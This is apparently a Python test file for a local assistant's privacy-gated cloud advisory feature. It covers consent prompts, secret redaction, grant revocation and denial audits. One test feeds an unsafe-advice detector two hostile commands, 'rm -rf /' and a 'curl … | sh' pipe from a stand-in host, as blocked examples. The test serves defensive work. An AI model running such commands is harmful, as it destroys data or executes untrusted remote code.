    assert _parse_cloud_control("/cloud off analyze Python") == (False, True, "analyze Python")
    assert _parse_cloud_control("请使用云端分析") == (False, False, "请使用云端分析")


def test_forced_vague_intent_sends_each_missing_item_then_reintegrates_locally() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    vague = {
        "state": "VAGUE",
        "intent_type": "unknown",
        "entities": {},
        "missing_info": ["traffic profile", "availability target"],
        "suggested_tools": ["local.inspect"],
        "risk_draft": "normal",
        "model_confidence": 0.2,
    }
    reintegrated = {
        "state": "READY",
        "intent_type": "analysis",
        "entities": {},
        "missing_info": [],
        "suggested_tools": [],
        "risk_draft": "normal",
        "model_confidence": 0.9,
    }
    model = SequencedMockModelBackend(
        [deepcopy(vague), deepcopy(vague), deepcopy(vague), vague, reintegrated],
        text_response="本地整合后的条件化建议。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    gateway = RecordingCloudGateway(AdvisoryResult(analysis="Conditional remote advice."))
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    prompt = app.handle(
        "/cloud ask 分析网关延迟问题并给出排查顺序",
        session_id="forced-vague-session",
    )

    assert "确认" in prompt
    assert app._pending_cloud is not None
    unknowns = [
        item.value
        for item in app._pending_cloud.preparation.candidates
        if item.label == "brief_unknowns"
    ]
    assert unknowns == ["traffic profile", "availability target"]
    assert app.handle("/cloud allow", session_id="forced-vague-session") == "本地整合后的条件化建议。"
    assert len(gateway.calls) == 1


def test_task_brief_candidate_builder_limits_unknowns_to_three() -> None:
    from src.core.schemas import MinimalContext
    from src.main import _with_task_brief_candidates

    proposal = _with_task_brief_candidates(
        None,
        MinimalContext(system_prompt="test", current_input="Analyze latency"),
        ["one", "two", "three", "four"],
    )

    assert [
        candidate.value
        for candidate in proposal.candidate_context
        if candidate.label == "brief_unknowns"
    ] == ["one", "two", "three"]


def test_task_brief_omits_question_when_the_model_did_not_propose_one() -> None:
    from src.core.schemas import MinimalContext
    from src.main import _with_task_brief_candidates

    proposal = _with_task_brief_candidates(
        None,
        MinimalContext(system_prompt="test", current_input="Analyze gateway latency"),
    )

    assert [candidate.label for candidate in proposal.candidate_context] == ["brief_goal"]


def test_task_brief_omits_a_model_question_identical_to_the_goal() -> None:
    from src.core.schemas import ConsultationProposal, MinimalContext
    from src.main import _with_task_brief_candidates

    proposal = _with_task_brief_candidates(
        ConsultationProposal(
            should_consult=True,
            escalation_reason="architecture_tradeoff",
            expected_benefit=0.8,
            proposed_question="  Analyze gateway latency  ",
        ),
        MinimalContext(system_prompt="test", current_input="Analyze gateway latency"),
    )

    assert [candidate.label for candidate in proposal.candidate_context] == ["brief_goal"]


def test_task_brief_keeps_a_distinct_model_proposed_question() -> None:
    from src.core.schemas import ConsultationProposal, MinimalContext
    from src.main import _with_task_brief_candidates

    proposal = _with_task_brief_candidates(
        ConsultationProposal(
            should_consult=True,
            escalation_reason="architecture_tradeoff",
            expected_benefit=0.8,
            proposed_question="Which timeout budget matches the reliability target?",
        ),
        MinimalContext(system_prompt="test", current_input="Analyze gateway latency"),
    )

    assert [candidate.label for candidate in proposal.candidate_context] == [
        "brief_goal",
        "brief_question",
    ]


def test_task_brief_deduplicates_sections_and_marks_automatic_project_summary() -> None:
    from src.core.schemas import ConsultationProposal, MinimalContext
    from src.main import _with_task_brief_candidates

    proposal = _with_task_brief_candidates(
        ConsultationProposal(
            should_consult=True,
            escalation_reason="reasoning_complexity",
            expected_benefit=0.8,
            proposed_question="分析登录失败原因",
            local_attempts_summary="已检查日志",
        ),
        MinimalContext(
            system_prompt="test",
            current_input="请分析登录失败原因",
            relevant_history=["请分析登录失败原因", "仅在历史中出现的证据"],
            project_state={
                "project_id": "must-not-leave",
                "summary": "项目当前使用本地认证",
                "summary_is_manual": False,
            },
        ),
        ["仅在历史中出现的证据", "还缺少服务端状态"],
    )

    values = {candidate.label: candidate.value for candidate in proposal.candidate_context}
    assert "brief_facts" not in values
    assert values["brief_project_note"].startswith("[本地模型推断，未经用户确认，不得当作事实]")
    assert "must-not-leave" not in str(values)
    assert values["brief_evidence"] == "仅在历史中出现的证据"
    assert [
        candidate.value
        for candidate in proposal.candidate_context
        if candidate.label == "brief_unknowns"
    ] == ["还缺少服务端状态"]


def test_task_brief_project_summary_prefix_is_manual_and_idempotent() -> None:
    from src.core.schemas import MinimalContext
    from src.main import _with_task_brief_candidates

    proposal = _with_task_brief_candidates(
        None,
        MinimalContext(
            system_prompt="test",
            current_input="继续",
            project_state={
                "summary": "[本地模型推断，未经用户确认，不得当作事实] 用户写下的摘要",
                "summary_is_manual": True,
            },
        ),
    )

    project_note = next(
        candidate.value
        for candidate in proposal.candidate_context
        if candidate.label == "brief_project_note"
    )
    assert project_note == "[用户手写的项目摘要] 用户写下的摘要"


def test_cloud_preview_redacts_chinese_natural_language_password() -> None:
    sink = RecordingEventSink()
    secret = "123456"
    request = f"/cloud ask 我的账号密码是{secret}\n请分析登录失败原因"

    app, gateway = _pending_cloud_app(sink, request=request, session_id="secret-session")
    assert app._pending_cloud is not None
    preview = str([(item.label, item.value) for item in app._pending_cloud.preparation.candidates])

    assert secret not in preview
    assert "[已脱敏:secret]" in preview
    assert any(
        event.stage == "cloud_consult"
        and event.data.get("phase") == "authorization_required"
        for event in sink.events
    )
    reintegration_model = MockModelBackend(
        structured_response={
            "state": "READY",
            "intent_type": "analysis",
            "entities": {},
            "missing_info": [],
            "suggested_tools": [],
            "risk_draft": "normal",
            "model_confidence": 0.9,
        },
        text_response="本地整合结论。",
    )
    reintegration_model.load()
    app.resolver.model = reintegration_model

    app.handle("/cloud allow", session_id="secret-session")

    assert secret not in str(gateway.calls)
    assert secret not in str(sink.events)
    assert secret not in str(app.memory._chunks)  # type: ignore[attr-defined]


def test_cloud_authorization_state_corruption_revokes_without_writing_memory() -> None:
    app, _ = _pending_cloud_app()
    pending = app._pending_cloud
    assert pending is not None
    app._local_task_context = None

    reply = app.handle("/cloud allow", session_id="cloud-session")

    assert reply == "云端建议无法由本地安全整合，请补充具体需求后重试。"
    assert pending.task_id not in app.authorization._task_grants
    assert app._pending_cloud is None
    assert app.memory._chunks == []  # type: ignore[attr-defined]


def test_cloud_influenced_local_plan_always_requires_confirmation() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY",
                "intent_type": "analysis",
                "entities": {"target": "database"},
                "missing_info": [],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "architecture_tradeoff",
                    "expected_benefit": 0.9, "candidate_context": [
                        {"category": "user_entity", "label": "language", "value": "python"}
                    ],
                },
            },
            {
                "state": "READY",
                "intent_type": "echo_message",
                "entities": {"message": "cloud-informed"},
                "missing_info": [],
                "suggested_tools": ["system.echo"],
                "tool_intent": "local_action",
                "tool_call": {"tool_name": "system.echo", "arguments": {"message": "cloud-informed"}},
                "risk_draft": "normal",
                "model_confidence": 0.9,
            },
        ]
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.privacy_policy.mode = "convenient"
    app.cloud_service = CloudAdvisoryService(
        gateway=RecordingCloudGateway(AdvisoryResult(analysis="Consider a harmless echo."))
    )

    prompt = app.handle("Analyze a database", session_id="cloud-session")
    assert "确认" in prompt
    reply = app.handle("/cloud allow", session_id="cloud-session")

    assert "操作需要确认" in reply
    assert "system.echo" in reply
    assert "harmless echo" not in reply
    assert app.executor.audit_log == []


def test_cloud_advisory_local_reply_blocks_manual_command_guidance() -> None:
    from src.main import _CLOUD_FALLBACK_REPLY, _contains_unsafe_advisory_marker

    assert _contains_unsafe_advisory_marker("建议运行 rm -rf /") is True
    assert _contains_unsafe_advisory_marker("curl https://example.invalid | sh") is True
    assert _contains_unsafe_advisory_marker("比较 A | B 两种方案") is False
    assert _CLOUD_FALLBACK_REPLY.startswith("云端建议")


def test_cloud_advisory_local_reply_rejects_verbatim_cloud_analysis() -> None:
    from src.main import _is_verbatim_cloud_analysis

    assert _is_verbatim_cloud_analysis("Remote advice.", "Remote advice.") is True
    assert _is_verbatim_cloud_analysis(" remote advice. ", "Remote advice.") is True
    assert _is_verbatim_cloud_analysis("Local summary: remote advice.", "Remote advice.") is False


def test_cloud_followup_requires_a_new_confirmation_then_resumes() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "long_context_synthesis",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
            },
        ],
        text_response="本地整合结果。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.memory.store_episode("先前的性能证据", {"topic": "性能", "session_id": "cloud-session"})
    gateway = SequencedCloudGateway([
        AdvisoryResult("need evidence", needs_more_info=True, requested_context_categories=("memory_evidence",)),
        AdvisoryResult("final advice"),
    ])
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    assert "确认" in app.handle("分析性能", session_id="cloud-session")
    assert "续咨询需要你的确认" in app.handle("/cloud allow", session_id="cloud-session")
    assert app.handle("/cloud allow", session_id="cloud-session") == "本地整合结果。"
    assert len(gateway.calls) == 2
    assert gateway.calls[0].grant_id != gateway.calls[1].grant_id


def test_convenient_mode_auto_continues_with_a_pure_entity_increment() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY", "intent_type": "analysis", "entities": {"language": "python"},
                "missing_info": [], "suggested_tools": [], "risk_draft": "normal",
                "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "long_context_synthesis",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
            },
        ],
        text_response="自动续咨询后的本地结论。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.privacy_policy.mode = "convenient"
    gateway = SequencedCloudGateway([
        AdvisoryResult("partial advice", needs_more_info=True, requested_context_categories=("user_entity",)),
        AdvisoryResult("final advice"),
    ])
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    assert "确认" in app.handle("分析 Python 方案", session_id="cloud-session")
    assert app.handle("/cloud allow", session_id="cloud-session") == "自动续咨询后的本地结论。"
    assert len(gateway.calls) == 2
    assert gateway.calls[0].grant_id != gateway.calls[1].grant_id


def test_sensitive_proposal_requires_explicit_followup_authorization_in_convenient_mode() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY", "intent_type": "analysis", "entities": {"language": "python"},
                "missing_info": [], "suggested_tools": [], "risk_draft": "sensitive",
                "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "reasoning_complexity",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "READY", "intent_type": "analysis", "entities": {},
                "missing_info": [], "suggested_tools": [], "risk_draft": "normal",
                "model_confidence": 0.9,
            },
        ],
        text_response="显式授权后的本地结论。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.privacy_policy.mode = "convenient"
    gateway = SequencedCloudGateway([
        AdvisoryResult(
            "partial advice",
            needs_more_info=True,
            requested_context_categories=("user_entity",),
        ),
        AdvisoryResult("final advice"),
    ])
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    assert "确认" in app.handle("分析 Python 方案", session_id="cloud-session")
    assert "续咨询需要你的确认" in app.handle(
        "/cloud allow", session_id="cloud-session"
    )
    assert len(gateway.calls) == 1
    assert app.handle("/cloud allow", session_id="cloud-session") == (
        "显式授权后的本地结论。"
    )
    assert len(gateway.calls) == 2


def test_sensitive_preparation_signal_is_derived_from_redaction_and_denials() -> None:
    from src.core.schemas import PreparedContextItem, PrivacyDenial, PrivacyPreparation
    from src.main import _preparation_contains_sensitive_candidates

    safe = PrivacyPreparation(
        [PreparedContextItem("user_entity", "language", "python", False, "safe")],
        [],
        frozenset({"user_entity"}),
        10,
    )
    redacted = PrivacyPreparation(
        [PreparedContextItem("free_text", "brief_goal", "[已脱敏:secret]", True, "redacted")],
        [],
        frozenset({"free_text"}),
        20,
    )
    denied = PrivacyPreparation(
        safe.candidates,
        [PrivacyDenial("free_text", "brief_goal", "residual sensitive data")],
        safe.required_categories,
        safe.prepared_context_bytes,
    )

    assert _preparation_contains_sensitive_candidates(safe) is False
    assert _preparation_contains_sensitive_candidates(redacted) is True
    assert _preparation_contains_sensitive_candidates(denied) is True


def test_redacted_payload_prevents_policy_grant_attempt_in_convenient_mode() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    raw_secret = "sk-EVAL-FAKE-abcdefghijklmnopqrstuvwxyz"
    model = SequencedMockModelBackend([
        {
            "state": "READY", "intent_type": "analysis", "entities": {"language": "python"},
            "missing_info": [], "suggested_tools": [], "risk_draft": "normal",
            "model_confidence": 0.9,
            "consultation_proposal": {
                "should_consult": True, "escalation_reason": "reasoning_complexity",
                "expected_benefit": 0.9,
            },
        }
    ])
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.privacy_policy.mode = "convenient"
    gateway = SequencedCloudGateway([
        AdvisoryResult(
            "partial advice",
            needs_more_info=True,
            requested_context_categories=("user_entity",),
        )
    ])
    app.cloud_service = CloudAdvisoryService(gateway=gateway)
    policy_grant_calls = 0
    original_create_policy_grant = app.authorization.create_policy_grant

    def count_policy_grant(*args: object, **kwargs: object) -> object:
        nonlocal policy_grant_calls
        policy_grant_calls += 1
        return original_create_policy_grant(*args, **kwargs)  # type: ignore[arg-type]

    app.authorization.create_policy_grant = count_policy_grant  # type: ignore[method-assign]

    first_preview = app.handle(
        f"分析 api_key={raw_secret} 的问题",
        session_id="cloud-session",
    )
    assert "[已脱敏:secret]" in first_preview
    assert raw_secret not in first_preview

    followup_preview = app.handle("/cloud allow", session_id="cloud-session")

    assert "续咨询需要你的确认" in followup_preview
    assert policy_grant_calls == 0
    assert len(gateway.calls) == 1
    assert app._pending_cloud is not None
    assert any(item.redacted for item in app._pending_cloud.preparation.candidates)


def test_policy_grant_defensive_rejection_is_observed_and_falls_back_to_authorization() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    sink = RecordingEventSink()
    model = SequencedMockModelBackend([
        {
            "state": "READY", "intent_type": "analysis", "entities": {"language": "python"},
            "missing_info": [], "suggested_tools": [], "risk_draft": "normal",
            "model_confidence": 0.9,
            "consultation_proposal": {
                "should_consult": True, "escalation_reason": "reasoning_complexity",
                "expected_benefit": 0.9,
            },
        }
    ])
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=model,
        event_sink_override=sink,
    )
    app.cloud_enabled = True
    app.privacy_policy.mode = "convenient"
    gateway = SequencedCloudGateway([
        AdvisoryResult(
            "partial advice",
            needs_more_info=True,
            requested_context_categories=("user_entity",),
        )
    ])
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    def reject_policy_grant(*args: object, **kwargs: object) -> object:
        del args, kwargs
        raise LocalMindError(
            "CLOUD_AUTHORIZATION_REQUIRED",
            "Policy grant was rejected",
            "该云端咨询需要你的确认后才能发送。",
            recoverable=False,
            details={"reason": "sensitive_policy_grant_forbidden"},
        )

    app.authorization.create_policy_grant = reject_policy_grant  # type: ignore[method-assign]

    assert "确认" in app.handle("分析 Python 方案", session_id="cloud-session")
    assert "续咨询需要你的确认" in app.handle(
        "/cloud allow", session_id="cloud-session"
    )
    assert len(gateway.calls) == 1
    assert app.memory._chunks == []  # type: ignore[attr-defined]
    assert any(
        event.stage == "cloud_consult"
        and event.data.get("phase") == "denied"
        and event.data.get("denied_reason") == "sensitive_policy_grant_forbidden"
        for event in sink.events
    )


def test_cloud_followup_without_new_context_converges_from_partial_advisory() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "long_context_synthesis",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
            },
        ],
        text_response="基于部分建议的本地结论。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    gateway = SequencedCloudGateway([
        AdvisoryResult("partial advice", needs_more_info=True, requested_context_categories=("user_entity",)),
    ])
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    assert "确认" in app.handle("分析这个问题", session_id="cloud-session")
    assert app.handle("/cloud allow", session_id="cloud-session") == "基于部分建议的本地结论。"
    assert len(gateway.calls) == 1


def test_new_input_cancels_a_suspended_cloud_task_and_revokes_its_grant() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "long_context_synthesis",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "VAGUE", "intent_type": "unknown", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.0,
            },
        ]
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.memory.store_episode("新的性能证据", {"topic": "性能", "session_id": "cloud-session"})
    app.cloud_service = CloudAdvisoryService(gateway=SequencedCloudGateway([
        AdvisoryResult("partial advice", needs_more_info=True, requested_context_categories=("memory_evidence",)),
    ]))

    assert "确认" in app.handle("分析性能", session_id="cloud-session")
    assert "续咨询需要你的确认" in app.handle("/cloud allow", session_id="cloud-session")
    task_id = app._pending_cloud.task_id  # type: ignore[union-attr]

    app.handle("开始另一个问题", session_id="cloud-session")

    assert app._pending_cloud is None
    assert app._local_task_context is None
    assert task_id not in app.authorization._task_grants


def test_explicit_cloud_cancel_writes_one_minimal_denial_audit() -> None:
    app, gateway = _pending_cloud_app()
    task_id = app._pending_cloud.task_id  # type: ignore[union-attr]

    assert app.handle("/cloud cancel", session_id="cloud-session") == "已取消云端咨询。"

    assert gateway.denials == [(task_id, "cloud-session", "user_cancelled")]
    assert app._pending_cloud is None
    assert app._local_task_context is None
    assert app.memory._chunks == []  # type: ignore[attr-defined]


def test_expired_cloud_authorization_writes_one_minimal_denial_audit() -> None:
    app, gateway = _pending_cloud_app()
    pending = app._pending_cloud
    assert pending is not None
    app._pending_cloud = replace(pending, created_at=pending.created_at - 301)

    assert app.handle("/cloud allow", session_id="cloud-session") == "云端授权已失效，需要重新确认。"

    assert gateway.denials == [(pending.task_id, "cloud-session", "authorization_expired")]
    assert app._pending_cloud is None
    assert app._local_task_context is None


def test_cloud_authorization_cannot_cross_provider_boundary() -> None:
    app, gateway = _pending_cloud_app()
    pending = app._pending_cloud
    assert pending is not None
    assert pending.provider == "noop"
    app.cloud_provider = "glm"

    reply = app.handle("/cloud allow", session_id="cloud-session")

    assert reply == "云端授权已失效，需要重新确认。"
    assert gateway.denials == [
        (pending.task_id, "cloud-session", "authorization_expired")
    ]
    assert app._pending_cloud is None
    assert app._local_task_context is None


def test_cross_session_cloud_authorization_writes_one_minimal_denial_audit() -> None:
    app, gateway = _pending_cloud_app()
    task_id = app._pending_cloud.task_id  # type: ignore[union-attr]

    assert app.handle("/cloud allow", session_id="other-session") == "云端授权属于其他会话，已取消。"

    assert gateway.denials == [(task_id, "cloud-session", "session_mismatch")]
    assert app._pending_cloud is None
    assert app._local_task_context is None


def test_new_input_superseding_cloud_authorization_writes_one_minimal_denial_audit() -> None:
    app, gateway = _pending_cloud_app()
    task_id = app._pending_cloud.task_id  # type: ignore[union-attr]

    app.handle("换一个问题", session_id="cloud-session")

    assert gateway.denials == [(task_id, "cloud-session", "superseded_by_new_input")]
    assert app._pending_cloud is None
    assert app._local_task_context is None


def test_failed_expanded_followup_converges_from_prior_partial_advisory() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "long_context_synthesis",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
                "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
            },
        ],
        text_response="从第一轮部分建议收敛的结论。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.memory.store_episode("新增性能证据", {"topic": "性能", "session_id": "cloud-session"})
    gateway = PartiallyFailingCloudGateway(
        AdvisoryResult("partial advice", needs_more_info=True, requested_context_categories=("memory_evidence",))
    )
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    assert "确认" in app.handle("分析性能", session_id="cloud-session")
    assert "续咨询需要你的确认" in app.handle("/cloud allow", session_id="cloud-session")
    assert app.handle("/cloud allow", session_id="cloud-session") == "从第一轮部分建议收敛的结论。"
    assert len(gateway.calls) == 2


def test_first_cloud_failure_revokes_the_active_task_grant() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend([
        {
            "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
            "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
            "consultation_proposal": {
                "should_consult": True, "escalation_reason": "architecture_tradeoff",
                "expected_benefit": 0.9,
            },
        },
    ])
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.cloud_service = CloudAdvisoryService(gateway=FailingCloudGateway())

    assert "确认" in app.handle("分析这个架构", session_id="cloud-session")
    assert app.handle("/cloud allow", session_id="cloud-session") == "云端服务暂不可用，请稍后重试。"

    assert app.authorization._task_grants == {}
    assert app._local_task_context is None
    assert len(app.memory._chunks) == 1  # type: ignore[attr-defined]
    assert "User: 分析这个架构" in app.memory._chunks[0].text  # type: ignore[attr-defined]
    assert (
        "Assistant: [云端建议，经本地整合] 云端服务暂不可用，请稍后重试。"
        in app.memory._chunks[0].text  # type: ignore[attr-defined]
    )


def test_memory_followup_keeps_each_evidence_chunk_separate() -> None:
    from src.core.schemas import (
        ConsultationProposal,
        InputEvent,
        MemoryChunk,
        MinimalContext,
        Result,
    )
    from src.main import LocalTaskContext, _followup_candidates

    class Memory:
        def retrieve(self, query: str, top_k: int, *, project_id: str | None = None):
            del query, top_k, project_id
            return Result.ok([
                MemoryChunk("one", "first evidence"),
                MemoryChunk("two", "second evidence"),
            ])

    local = LocalTaskContext(
        InputEvent("analyze", "session-1", "2026-09-08T00:00:00+00:00"),
        "task-1", "session-1", "long_context_synthesis",
        MinimalContext(system_prompt="test"),
        ConsultationProposal(False, "unknown", 0.0), {},
    )

    candidates = _followup_candidates(("memory_evidence",), local, Memory())

    assert [(item.label, item.value) for item in candidates] == [
        ("brief_evidence", "first evidence"),
        ("brief_evidence", "second evidence"),
    ]


def test_user_entity_followup_is_marked_as_local_task_context() -> None:
    from src.core.schemas import ConsultationProposal, InputEvent, MinimalContext
    from src.main import LocalTaskContext, _followup_candidates

    local = LocalTaskContext(
        InputEvent("分析 Python 方案", "session-1", "2026-09-08T00:00:00+00:00"),
        "task-1", "session-1", "architecture_tradeoff",
        MinimalContext(system_prompt="test"),
        ConsultationProposal(False, "unknown", 0.0), {"language": "python"},
    )

    candidates = _followup_candidates(("user_entity",), local, memory=None)  # type: ignore[arg-type]

    assert candidates == [ContextCandidate("user_entity", "language", "python", "local_task_context")]


def test_cloud_authorization_errors_are_returned_as_user_messages() -> None:
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())
    app._pending_cloud = object()  # type: ignore[assignment]
    assert app.handle("/cloud allow", session_id="session-1") == "系统内部错误，请重试。"


def test_bootstrap_defaults_cloud_context_limits_to_the_s07_safe_values() -> None:
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())

    assert app.authorization._max_context_items == 12
    assert app.privacy_policy.max_context_items == 12
    assert app.authorization._max_context_bytes == 32_768
    assert app.privacy_policy.max_context_bytes == 32_768


def test_p4_demo_script_runs_without_network_access() -> None:
    result = subprocess.run(
        [sys.executable, "scripts/run_p4.py"],
        cwd=Path(__file__).parents[1],
        check=False,
        capture_output=True,
        text=True,
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "本地整合建议：先检查索引与查询计划。"
